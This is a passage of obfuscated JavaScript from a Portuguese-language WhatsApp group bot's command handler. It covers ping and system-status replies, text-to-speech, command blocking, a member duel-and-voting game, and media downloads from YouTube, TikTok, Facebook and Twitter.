                let _0x350dc2 = "╔┉✼┉═══༺◈✼" + _0x2cd689 + "✼◈༻═══┉✼┉╗\n║\n║ ू ፝͜❥ " + _0x33c0c0 + " @" + _0x45b1c6 + "\n║\n║ 🤖 *" + _0x27bb2f + " ONLINE* 🤖\n║\n║ ⏳ Tempo Online:\n║   " + _0x5c7cc1 + "\n║\n║ 🖥️ Arquitetura: " + _0x543389.arch() + "\n║ 💽 Sistema: " + _0x543389.platform() + "\n║ 🧠 Memória: " + _0x2bde6f(_0x5081b4) + " / " + _0x2bde6f(_0x2859c3) + "\n║ 💨 Velocidade de Resposta: " + _0x4421b4 + "\n║ 📊 Memória RAM Usada: " + _0x54fb53.toFixed(_0x54fb53 % 1 !== 0 ? 2 : 0) + " " + _0x3afe34 + _0x573d71 + "\n║ 💾 Memória RAM Livre: " + _0x2bde6f(_0x3c8ee1) + "\n║\n╚┉✼┉═══༺◈✼" + _0x2cd689 + "✼◈༻═══┉✼┉╝";
                const _0x89fb12 = {
                  text: _0x350dc2,
                  mentions: [_0x246d48]
                };
                const _0x4ceb70 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, _0x89fb12, _0x4ceb70);
              }
              break;
            case "ping3":
              let _0x38455d = speed();
              let _0x5e102a = speed() - _0x38455d;
              {
                const _0x54d02e = {
                  text: '🚀',
                  key: _0xd2050d.key
                };
                const _0x1df797 = {
                  react: _0x54d02e
                };
                _0x5196be.sendMessage(_0x346d97, _0x1df797);
                r = Date.now() / 1000 - _0xd2050d.messageTimestamp;
                uptime = process.uptime();
                infoSystem = require('os');
                respon = (_0x33c0c0 + ", Usuário: @" + _0x246d48.split('@')[0] + "\n\n⏱ Velocidade: " + _0x5e102a.toFixed(4) + " _segundos._\n🤖 Tempo online: " + kyun(uptime) + "\n💻 Sistema Operacional: " + infoSystem.type() + "\n📂 Versão: " + infoSystem.release() + "\n💾 Memoria RAM total: " + (infoSystem.totalmem() / Math.pow(1024, 3)).toFixed(2) + "GB\n💾 Memoria RAM disponível: " + (infoSystem.freemem() / Math.pow(1024, 3)).toFixed(2) + 'GB').trim();
                const _0x48f820 = {
                  quoted: _0xd2050d
                };
                await _0x5196be.sendMessage(_0x346d97, {
                  'image': {
                    'url': "https://tionaryp.sirv.com/xanaxrobot/pingxanax3.png?text.0.text=VELOCIDADE%20DO%20PACWARS&text.0.position.gravity=north&text.0.position.y=15%25&text.0.size=40&text.0.font.family=Teko&text.0.font.weight=800&text.0.background.opacity=100&text.0.outline.blur=100&text.1.text=%20%20%20" + _0x5e102a.toFixed(4) + "&text.1.position.gravity=center&text.1.size=30&text.1.color=ffffff&text.1.font.family=Teko&text.1.font.weight=800&text.1.background.opacity=100&text.1.outline.blur=100"
                  },
                  'caption': respon
                }, _0x48f820);
              }
              break;
            case "gtts":
            case "falar":
              try {
                const _0x2915af = {
                  text: "Cade o texto?, digite algo Exemplo:\n" + _0x141936 + "gtts PT Oi"
                };
                const _0x3f9f46 = {
                  quoted: _0xd2050d
                };
                if (_0x23d865.length < 1) {
                  return _0x5196be.sendMessage(_0x346d97, _0x2915af, _0x3f9f46);
                }
                const _0x26c9dc = require("./armor/funcoes/gtts")(_0x23d865[0]);
                const _0x2d1a04 = {
                  quoted: _0xd2050d
                };
                if (_0x23d865.length < 2) {
                  return _0x5196be.sendMessage(_0x346d97, {
                    'text': "Falta colocar o código do idioma!"
                  }, _0x2d1a04);
                }
                dtt = _0x3ac611.slice(8);
                ranm = getRandom(".mp3");
                rano = getRandom(".ogg");
                if (dtt.length > 200) {
                  return _0x50740b("Para reduzir spam o máximo de letras permitidas são 200!");
                }
                _0x26c9dc.save(ranm, dtt, function () {
                  exec("ffmpeg -i " + ranm + " -ar 48000 -vn -c:a libopus " + rano, _0x25d01b => {
                    const _0x49919c = {
                      quoted: _0xd2050d
                    };
                    _0x5196be.sendMessage(_0x346d97, {
                      'audio': fs.readFileSync(ranm),
                      'ptt': true,
                      'mimetype': "audio/mpeg"
                    }, _0x49919c)["catch"](_0x4c6bd3 => {
                      return _0x50740b("Erro..");
                    });
                    DLT_FL(ranm);
                    DLT_FL(rano);
                  });
                });
              } catch {
                return _0x50740b("Erro..");
              }
              break;
            case "tagme":
              const _0x565908 = '@' + _0x45b1c6 + " ✔️";
              await _0x1106fd(_0x565908, [_0x246d48], true);
              break;
            case "blockcmd":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x11e99e.trim().toLowerCase().includes("blockcmd blockcmd") || _0x11e99e.trim().toLowerCase().includes("blockcmd  blockcmd")) {
                return _0x50740b("Tá louco maluco?, Quer banir o comando de bloquear comando?");
              }
              if (getComandoBlock(_0x346d97).includes(_0x11e99e.trim().toLowerCase())) {
                return _0x50740b("Este comando já está blockeado");
              }
              addComandos(_0x346d97, _0x11e99e.trim().toLowerCase());
              _0x50740b("O comando " + _0x23d865[0] + " Foi blockeado");
              break;
            case "unblockcmd":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x11e99e.trim().toLowerCase().includes("blockcmd unblockcmd") || _0x11e99e.trim().toLowerCase().includes("blockcmd  unblockcmd")) {
                return _0x50740b("Tá louco maluco?, Quer banir o comando de desbloquear comando?");
              }
              if (!getComandoBlock(_0x346d97).includes(_0x11e99e.trim().toLowerCase())) {
                return _0x50740b("Este comando já está  desbloqueado");
              }
              deleteComandos(_0x346d97, _0x11e99e.trim().toLowerCase());
              _0x50740b("O comando " + _0x23d865[0] + " Foi desblockeado");
              break;
            case "listacomandos":
            case "listblockcmd":
            case "listablockcmd":
              tkks = "╭─*「 *COMANDOS BLOCK* 」\n";
              for (let _0x13e855 of getComandoBlock(_0x346d97)) {
                tkks += "│+  " + _0x13e855 + "\n";
              }
              tkks += "│+ Total : " + getComandoBlock(_0x346d97).length + "\n╰──────*「 *" + NomeDoBot + "* 」*────";
              const _0x10bd71 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': tkks.trim()
              }, _0x10bd71);
              break;
            case "avalie":
              const _0x50279b = _0x3ac611.slice(8);
              if (_0x23d865.length <= 1) {
                return _0x50740b("Exemplo: " + _0x141936 + "avalie \"Bot muito bom, parabéns. \"");
              }
              const _0x3282bc = {
                quoted: _0xd2050d
              };
              if (_0x23d865.length >= 400) {
                return _0x5196be.sendMessage(_0x346d97, {
                  'text': "Máximo 400 caracteres"
                }, _0x3282bc);
              }
              var _0x2d63f4 = _0xd2050d.participant;
              tdptls = "[ Avaliação ]\nDe: wa.me/" + _0x246d48.split("@s.whatsapp.net")[0] + "\n: " + _0x50279b;
              const _0x14a225 = {
                text: tdptls
              };
              const _0x243d33 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0xbd10de, _0x14a225, _0x243d33);
              _0x50740b("mensagem enviada ao meu dono, obrigado pela avaliação, iremos melhorar a cada dia.");
              break;
            case "bug":
              const _0x472a4b = _0x3ac611.slice(5);
              if (_0x23d865.length <= 1) {
                return _0x50740b("Exemplo: " + _0x141936 + "bug \"ocorreu um erro no comando sticker\"");
              }
              const _0xd6f104 = {
                quoted: _0xd2050d
              };
              if (_0x23d865.length >= 800) {
                return _0x5196be.sendMessage(_0x346d97, {
                  'text': "Máximo 800 caracteres"
                }, _0xd6f104);
              }
              var _0x2d63f4 = _0xd2050d.participant;
              teks1 = "[ Problema ]\nDe: wa.me/" + _0x246d48.split("@s.whatsapp.net")[0] + "\nErro ou bug: " + _0x472a4b;
              const _0x3c80a7 = {
                text: teks1
              };
              const _0x444f04 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0xbd10de, _0x3c80a7, _0x444f04);
              _0x50740b("mensagem enviada ao meu dono, se enviar muitas mensagens repetida por zoueiras, você sera banido de utilizar os comandos do bot.");
              break;
            case "sugestão":
            case "sugestao":
              const _0x189d1c = _0x3ac611.slice(10);
              if (_0x23d865.length <= 1) {
                return _0x50740b("Exemplo: " + _0x141936 + "sugestao \"Opa, crie um comando tal, que ele funcione de tal maneira, isso será muito bom, não só pra mim, mas pra vários fazer isso..\"");
              }
              const _0x1ad55e = {
                quoted: _0xd2050d
              };
              if (_0x23d865.length >= 800) {
                return _0x5196be.sendMessage(_0x346d97, {
                  'text': "Máximo 800 caracteres"
                }, _0x1ad55e);
              }
              var _0x2d63f4 = _0xd2050d.participant;
              sug = "[ Sugestões ]\nDe: wa.me/" + _0x246d48.split("@s.whatsapp.net")[0] + "\n: " + _0x189d1c;
              const _0x96b50b = {
                text: sug
              };
              const _0xb0beb7 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0xbd10de, _0x96b50b, _0xb0beb7);
              _0x50740b("mensagem enviada ao meu dono, obrigado pela sugestão, tentar ouvir o máximo possível de sugestões.");
              break;
            case "grupos":
              {
                _0x50740b("Realizando ação, aguarde.");
                _0x37575f = await reqapi.grupos(_0x11e99e);
                let _0x3cde8d = "Listagem de grupos para você:\n\n";
                _0x37575f.forEach(function (_0x6e2abd) {
                  _0x3cde8d += " - Url do Grupo: " + _0x6e2abd.link + "\n\n - Descrição: " + _0x6e2abd.desc + "\n\n" + '-'.repeat(20) + "\n\n";
                });
                _0x50740b(_0x3cde8d);
              }
              break;
            case "gimage":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " naruto");
                }
                let _0x392b93 = await reqapi.gimage(_0x11e99e.trim());
                _0x5196be.sendMessage(_0x346d97, {
                  'image': {
                    'url': _0x392b93[Math.floor(Math.random() * _0x392b93.length)].url
                  }
                })["catch"](() => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x451630) {
                return _0x50740b("Erro..");
              }
              break;
            case "pinterest":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " naruto");
                }
                let _0x450419 = await reqapi.pinterest(_0x11e99e.trim());
                _0x5196be.sendMessage(_0x346d97, {
                  'image': {
                    'url': _0x450419[Math.floor(Math.random() * _0x450419.length)]
                  }
                })["catch"](() => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x318d85) {
                return _0x50740b("Erro..");
              }
              break;
            case "triggered":
              try {
                if (_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a) {
                  _0x48d7b9 = _0x54198a ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xd2050d.message.imageMessage;
                  owgi = await getFileBuffer(_0x48d7b9, "image");
                  _0x24e1d3 = await upload(owgi);
                  _0x125a55(_0x346d97, reqapi.trigger(_0x24e1d3));
                } else {
                  _0x50740b("Marque uma imagem no WhatsApp...");
                }
              } catch {
                _0x50740b("Erro");
              }
              break;
            case "gerarlink":
            case "imgpralink":
              try {
                if ((_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a) && !_0x11e99e.length <= 1) {
                  _0x50740b(_0x50f430);
                  let _0x1bb2db;
                  _0x1bb2db = _0x54198a ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.imageMessage : _0xd2050d.message.imageMessage;
                  owgi = await getFileBuffer(_0x1bb2db, "image");
                  _0x36d5cf = await upload(owgi);
                  _0x50740b(_0x36d5cf);
                } else {
                  _0x48d7b9 = _0xee3727 ? JSON.parse(JSON.stringify(_0xd2050d).replace("quotedM", 'm')).message.extendedTextMessage.contextInfo.message.videoMessage : _0xd2050d.message.videoMessage;
                  owgi = await getFileBuffer(_0x48d7b9, "video");
                  _0x36d5cf = await upload(owgi);
                  _0x50740b(_0x36d5cf);
                }
              } catch (_0x2e2c44) {
                return _0x50740b("Só gero link de imagem, sinto mt / Erro");
              }
              break;
            case "ytsearch":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Digite o nome de algum vídeo ou música que deseja encontrar..");
                }
                _0x29f7cd = await reqapi.ytsearch(_0x11e99e.trim());
                let _0x15cb09 = "-\t".repeat(13) + "\n\n";
                for (var _0x3194f3 of _0x29f7cd) {
                  _0x15cb09 += "Titulo: " + _0x3194f3.titulo + "\nUrl: " + _0x3194f3.url + "\nTempo: " + _0x3194f3.tempo + "\nPostado: " + _0x3194f3.postado + "\n\nDescrição: " + _0x3194f3.desc + "\n\n";
                  _0x15cb09 += "-\t".repeat(13) + "\n\n";
                }
                _0x50740b(_0x15cb09);
              } catch (_0x570bf8) {
                return _0x50740b("Erro....");
              }
              break;
            case "votar_duelo":
            case "votar_combate":
              if (_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em privado após a votação ser iniciada em algum grupo, lá terá o exemplo..");
              }
              let _0xda3b6e = _0x11e99e.trim();
              if (!fs.existsSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json")) {
                return _0x50740b("Nenhum duelo foi iniciado nesse grupo..");
              }
              var _0x1778e3 = JSON.parse(fs.readFileSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json"));
              if (_0x1778e3.voto_usu1.includes(_0x246d48)) {
                return _0x50740b("Você já votou em alguem, então não pode votar novamente.");
              }
              if (_0x1778e3.voto_usu2.includes(_0x246d48)) {
                return _0x50740b("Você já votou em alguem, então não pode votar novamente.");
              }
              if (_0x1778e3.usu1 == _0xda3b6e + "@s.whatsapp.net") {
                _0x1778e3.voto_usu1.push(_0x246d48);
              } else {
                _0x1778e3.voto_usu2.push(_0x246d48);
              }
              fs.writeFileSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json", JSON.stringify(_0x1778e3, null, 2));
              _0x50740b("Votou com sucesso, agora só aguardar terminar, para ver os resultados 🙂.");
              break;
            case "votar":
            case "como_votar":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!fs.existsSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json")) {
                return _0x50740b("Nenhum duelo foi iniciado nesse grupo..");
              }
              _0x50740b("Como votar foi enviado no seu privado a explicação dos 2.");
              var _0x1778e3 = JSON.parse(fs.readFileSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json"));
              const _0x5b1e30 = {
                text: "Para votar no primeiro usario:\nUse o comando: " + setting.prefix + "votar_duelo " + _0x1778e3.usu1 + "\n\nPara votar no segundo usuario:\n\nUse o comando: " + setting.prefix + "votar_duelo " + _0x1778e3.usu2
              };
              _0x5196be.sendMessage(_0x246d48, _0x5b1e30);
              break;
            case "zerar_duelo":
            case "zerar_combate":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Apenas administrador..");
              }
              if (!fs.existsSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json")) {
                return _0x50740b("Nenhum duelo foi iniciado nesse grupo..");
              }
              DLT_FL("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json");
              _0x50740b("Duelo resetado / cancelado..");
              break;
            case "terminar_votacao":
              try {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Apenas administrador..");
                }
                if (!fs.existsSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json")) {
                  return _0x50740b("Nenhum duelo foi iniciado nesse grupo..");
                }
                _0x1778e3 = JSON.parse(fs.readFileSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json"));
                if (_0x1778e3.voto_usu1.length == _0x1778e3.voto_usu2.length) {
                  return _0x50740b("[ OBS ] - OS 2 USUARIOS TERMINARAM EMPATE, COM MESMA PONTUAÇÃO:\n\n1: " + _0x1778e3.voto_usu1.length + " Votos\n\n2: " + _0x1778e3.voto_usu2.length + " Votos\n\nEntão a decisão está na mão dos administradores, se vai refazer o duelo, ou decidir o ganhador de alguma fórma..");
                }
                let _0x58f14d = "[ Ganhador: @" + (_0x1778e3.voto_usu1.length > _0x1778e3.voto_usu2.length ? _0x1778e3.usu1.split('@')[0] : _0x1778e3.usu2.split('@')[0]) + " ]\n\nUsuário _- 1 - @" + _0x1778e3.usu1.split('@')[0] + "\n\nQuantidade de votos: " + _0x1778e3.voto_usu1.length + "\n_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n\nUsuário _- 2 - @" + _0x1778e3.usu2.split('@')[0] + "\n\nQuantidade de votos: " + _0x1778e3.voto_usu2.length + "\n";
                try {
                  pfimg = await _0x5196be.profilePictureUrl((_0x1778e3.voto_usu1.length > _0x1778e3.voto_usu2.length ? _0x1778e3.usu1.split('@')[0] : _0x1778e3.usu2.split('@')[0]) + "@c.us", "image");
                } catch {
                  pfimg = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                ;
                bl1 = await getBuffer(pfimg);
                bl_up = await upload(bl1);
                blar = await getBuffer("https://eruakorl.sirv.com/josival-aleatory/ganhador.jpg?text.0.text=" + (_0x1778e3.voto_usu1.length > _0x1778e3.voto_usu2.length ? _0x1778e3.usu1.split('@')[0] : _0x1778e3.usu2.split('@')[0]) + "&text.0.position.gravity=center&text.0.position.y=22%25&text.0.size=62&text.0.color=000000&text.0.font.family=Source%20Serif%20Pro&text.0.font.weight=700&text.0.font.style=italic");
                bli = await upload(blar);
                _0x5196be.sendMessage(_0x346d97, {
                  'image': {
                    'url': reqapi.duelowin(bl_up, bli)
                  },
                  'caption': _0x58f14d,
                  'mentions': [_0x1778e3.usu1, _0x1778e3.usu2]
                });
              } catch {
                _0x50740b("Erro, tente novamente..");
              }
              U_S_US = "Usuarios que votou em: " + _0x1778e3.usu1.split('@')[0] + "\n\n";
              for (let _0x2542f7 of _0x1778e3.voto_usu1) {
                U_S_US += "- ( https://wa.me/" + _0x2542f7.split('@')[0] + " )\n\n";
              }
              U_S_US += "Usuarios que votou em: " + _0x1778e3.usu2.split('@')[0] + "\n\n";
              for (let _0x7fcdec of _0x1778e3.voto_usu2) {
                U_S_US += "- ( https://wa.me/" + _0x7fcdec.split('@')[0] + " )\n";
              }
              const _0x17b53e = {
                text: U_S_US
              };
              _0x5196be.sendMessage(_0x246d48, _0x17b53e);
              await setTimeout(() => {
                DLT_FL("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json");
              }, 30000);
              break;
            case "iniciar_votacao":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Apenas administrador..");
              }
              if (!fs.existsSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json")) {
                return _0x50740b("Nenhum duelo foi iniciado nesse grupo..");
              }
              _0x1778e3 = JSON.parse(fs.readFileSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json"));
              _0x5dcc57("[ ATENÇÃO ] - Votação iniciada, prestem atenção.\n\n@" + _0x1778e3.usu1.split('@')[0] + "\nPara votar no primeiro usuario do duelo: \nhttps://wa.me/" + _0x517366.split('@')[0] + "?text=" + setting.prefix + "votar_duelo%20" + _0x1778e3.usu1.split('@')[0] + '/' + _0x346d97 + "\n\n@" + _0x1778e3.usu2.split('@')[0] + "\nPara votar no segundo usuario do duelo:\nhttps://wa.me/" + _0x517366.split('@')[0] + "?text=" + _0x141936 + "votar_duelo%20" + _0x1778e3.usu2.split('@')[0] + '/' + _0x346d97);
              break;
            case "duelo":
            case "combate":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Apenas administrador..");
              }
              try {
                TXTEX = "Olá, para iniciar o duelo, você precisa marcar 2 pessoas.\nExemplo: " + (_0x141936 + _0x267d4b) + " @fulano1 @fulano2.";
                if (!_0xd79836 || _0xd79836?.["length"] > 2) {
                  return _0x50740b(TXTEX);
                }
                try {
                  pfimg = await _0x5196be.profilePictureUrl(_0xd79836[0].split('@')[0] + "@c.us", "image");
                } catch {
                  pfimg = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                ;
                bl1 = await getBuffer(pfimg);
                bl_up = await upload(bl1);
                try {
                  pfimg2 = await _0x5196be.profilePictureUrl(_0xd79836[1].split('@')[0] + "@c.us", "image");
                } catch {
                  pfimg2 = "https://telegra.ph/file/b5427ea4b8701bc47e751.jpg";
                }
                ;
                bl2 = await getBuffer(pfimg2);
                bl_up2 = await upload(bl2);
                gtb = await getBuffer("https://eruakorl.sirv.com/josival-aleatory/vs.jpg?text.0.text=" + _0xd79836[0].split('@')[0] + "&text.0.position.gravity=southwest&text.0.position.x=6%25&text.0.position.y=-2%25&text.0.size=32&text.0.color=ff0000&text.0.font.family=Source%20Serif%20Pro&text.0.font.weight=700&text.0.font.style=italic&text.0.background.opacity=100&text.1.text=" + _0xd79836[1].split('@')[0] + "&text.1.position.x=-7%25&text.1.position.y=-2%25&text.1.size=32&text.1.color=0022ff&text.1.font.family=Source%20Serif%20Pro&text.1.font.weight=700&text.1.font.style=italic");
                txtimg = await upload(gtb);
                _0x5196be.sendMessage(_0x346d97, {
                  'image': {
                    'url': reqapi.duelo(bl_up, bl_up2, txtimg)
                  },
                  'caption': "[ ATENÇÃO ]:\n\n@" + _0xd79836[0].split('@')[0] + "\n\t\t\t\t\t~ VS ~\n@" + _0xd79836[1].split('@')[0] + "\n\n[ Combate iniciado ] - Respeitem os Combatentes. Os dois participantes irão combater no momento. Posteriormente um ADM vai iniciar a votação. Digitando: !iniciar_votação. Atenção a votação, avalie com responsabilidade. Não atrapalhem o momento do combate para não serem removidos.",
                  'mentions': _0xd79836
                })["catch"](_0x260fae => {
                  _0x50740b("Erro");
                });
                await sleep(1000);
                const _0x3c0572 = {
                  usu1: _0xd79836[0],
                  usu2: _0xd79836[1],
                  iniciou: false,
                  voto_usu1: [],
                  voto_usu2: []
                };
                fs.writeFileSync("./DADOS/json/DUELO/duelo_" + _0x346d97 + ".json", JSON.stringify(_0x3c0572, null, 2));
              } catch (_0x10bc43) {
                _0x50740b("Erro, tente novamente..");
              }
              break;
            case "testess":
              _0x36d5cf = await yts(_0x11e99e);
              console.log(_0x36d5cf.videos[0]);
              break;
            case "play_video":
            case "ytmp4":
            case "play_mp4":
            case "playmp4":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " link ou nome");
                }
                _0x50740b(_0x50f430);
                _0x5aeb20 = await reqapi.ytsearch(_0x11e99e.trim());
                const _0x27f255 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'video': {
                    'url': reqapi.play(_0x11e99e.trim(), false)
                  },
                  'mimetype': "video/mp4",
                  'fileName': _0x5aeb20[0]?.["titulo"] || "play.mp4"
                }, _0x27f255)["catch"](_0x5cf543 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x190af0) {
                return _0x50740b("Erro...");
              }
              break;
            case "play_audio":
            case "ytmp3":
            case "playaudio":
            case "playmp3":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("- Exemplo: " + _0x141936 + "play nome da música\na música será baixada, só basta escolher áudio ou vídeo, se não baixar, o YouTube privou de não baixarem, ou algo do tipo..");
                }
                var _0x3a9183 = await _0x3af65f(_0x11e99e);
                _0x5aeb20 = await yts(_0x3a9183);
                if (_0x5aeb20.videos[0].timestamp.length >= 9) {
                  return _0x50740b("Desculpe, este vídeo ou áudio é muito grande, não poderei realizar este pedido, peça outra música abaixo de uma hora.");
                }
                _0x50740b(_0x50f430);
                var _0x29d697 = " Não encontrado.";
                var _0x1b4204 = "\n๖ۣ• Título: " + (_0x5aeb20?.["videos"][0]?.["title"] || _0x29d697) + "\n๖ۣ• Tempo: " + (_0x5aeb20?.["videos"][0]?.["timestamp"] || _0x29d697) + "\n๖ۣ• Postado: " + (_0x5aeb20?.["videos"][0]?.["ago"] || _0x29d697) + "\n๖ۣ• Canal: " + (_0x5aeb20?.["videos"][0]?.["author"]?.["name"] || _0x29d697) + "\n๖ۣ• Descrição: " + (_0x5aeb20?.["videos"][0]?.["description"] || _0x29d697) + "\n\n■■■■■ 100% \n\nEscolha uma opção...\n\nSe desejar baixar o vídeo, use " + _0x141936 + "play_video " + _0x11e99e.trim() + "\n";
                if (_0x5aeb20.videos[0].thumbnail) {
                  const _0x13af8b = {
                    url: _0x5aeb20.videos[0].thumbnail
                  };
                  const _0x2dcd5c = {
                    image: _0x13af8b,
                    caption: _0x1b4204,
                    mentions: [_0x246d48]
                  };
                  const _0x2cad19 = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x2dcd5c, _0x2cad19);
                } else {
                  var _0x1ffe68 = _0x257290(logoslink.status1);
                  const _0x2e0fad = {
                    ..._0x1ffe68
                  };
                  _0x2e0fad.caption = _0x1b4204;
                  _0x2e0fad.mentions = [_0x246d48];
                  const _0x42482e = {
                    quoted: _0xd2050d
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x2e0fad, _0x42482e);
                }
                delay(500);
                const _0xe24ba4 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'audio': {
                    'url': reqapi.play(_0x11e99e.trim(), true)
                  },
                  'mimetype': "audio/mpeg",
                  'fileName': _0x5aeb20[0]?.["titulo"] || "play.mp3"
                }, _0xe24ba4)["catch"](_0x526d10 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x1aeee6) {
                console.log(_0x1aeee6);
                return _0x50740b("Seja mais específico, não deu pra encontrar com apenas isto... / Erro");
              }
              break;
            case "tiktok_video":
              try {
                if (!_0x11e99e.includes("tiktok")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " link do Tiktok");
                }
                _0x50740b(_0x50f430);
                const _0x43a976 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'video': {
                    'url': reqapi.tiktok(_0x11e99e.trim())
                  },
                  'mimetype': "video/mp4",
                  'caption': "Se deseja baixar em formato audio, use o comando: " + _0x141936 + "tiktok_audio " + _0x11e99e.trim()
                }, _0x43a976)["catch"](_0x549153 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x5c2676) {
                return _0x50740b("Erro...");
              }
              break;
            case "tiktok_audio":
              try {
                if (!_0x11e99e.includes("tiktok")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " link do Tiktok");
                }
                _0x50740b(_0x50f430);
                const _0x469eeb = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  'audio': {
                    'url': reqapi.tiktok(_0x11e99e.trim())
                  },
                  'mimetype': "audio/mpeg"
                }, _0x469eeb)["catch"](_0x5b1ef0 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x33d634) {
                return _0x50740b("Erro...");
              }
              break;
            case "face_video":
            case "facebook_video":
              try {
                if (!_0x11e99e.includes("facebook") && !_0x11e99e.includes("fb.watch")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " o link do Facebook");
                }
                _0x50740b(_0x50f430);
                _0x5196be.sendMessage(_0x346d97, {
                  'video': {
                    'url': reqapi.facebook(_0x11e99e.trim(), false)
                  },
                  'mimetype': "video/mp4",
                  'caption': "Se deseja baixar em formato audio, use o comando: " + _0x141936 + "face_audio " + _0x11e99e.trim()
                })["catch"](_0x5cb3f1 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x3f7481) {
                return _0x50740b("Erro..");
              }
              break;
            case "face_audio":
            case "facebook_audio":
              try {
                if (!_0x11e99e.includes("facebook") && !_0x11e99e.includes("fb.watch")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " o link do Facebook");
                }
                _0x50740b(_0x50f430);
                _0x5196be.sendMessage(_0x346d97, {
                  'audio': {
                    'url': reqapi.facebook(_0x11e99e.trim(), true)
                  },
                  'mimetype': "audio/mpeg"
                })["catch"](_0x7cc561 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x525bdb) {
                return _0x50740b("Erro..");
              }
              break;
            case "twitter_video":
              try {
                if (!_0x11e99e.includes("twitter") && !_0x11e99e.includes("x.com")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " o link do Twitter");
                }
                q8 = _0x11e99e.replace("x.com", "twitter.com");
                _0x50740b(_0x50f430);
                _0x5196be.sendMessage(_0x346d97, {
                  'video': {
                    'url': reqapi.twitter(q8.trim(), false)
                  },
                  'mimetype': "video/mp4",
                  'caption': "Se deseja baixar em formato audio, use o comando: " + _0x141936 + "twitter_audio " + _0x11e99e.trim()
                })["catch"](_0x23914f => {
                  return _0x50740b(String(_0x23914f));
                });
              } catch (_0xf4b471) {
                return _0x50740b("Erro..");
              }
              break;
            case "twitter_audio":
              try {
                if (!_0x11e99e.includes("twitter") && !_0x11e99e.includes("x.com")) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " o link do Twitter");
                }
                q8 = _0x11e99e.replace("x.com", "twitter.com");
                _0x50740b(_0x50f430);
                _0x5196be.sendMessage(_0x346d97, {
                  'audio': {
                    'url': reqapi.twitter(q8.trim(), true)
                  },
                  'mimetype': "audio/mpeg"
                })["catch"](_0x328dda => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x332a4b) {
                return _0x50740b("Erro..");
              }
              break;
            case "insta_video":
            case "instagram_video":
              try {
                if (_0x11e99e.length < 5) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " o link");
                }
